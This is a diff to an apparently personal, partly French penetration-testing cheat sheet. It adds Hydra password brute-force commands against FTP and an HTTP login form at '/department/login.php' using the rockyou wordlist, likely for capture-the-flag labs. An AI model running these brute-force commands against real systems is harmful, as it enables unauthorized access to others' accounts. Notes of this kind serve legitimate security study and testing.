@@ -43,8 +43,16 @@ Tourne en python2
 
 ## Hydra
 
+### ftp
+
 ```
 hydra -l chris -P rockyou.txt $IP ftp -t 20
+```
+
+### http
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
 ```
 
 ## John The Ripper
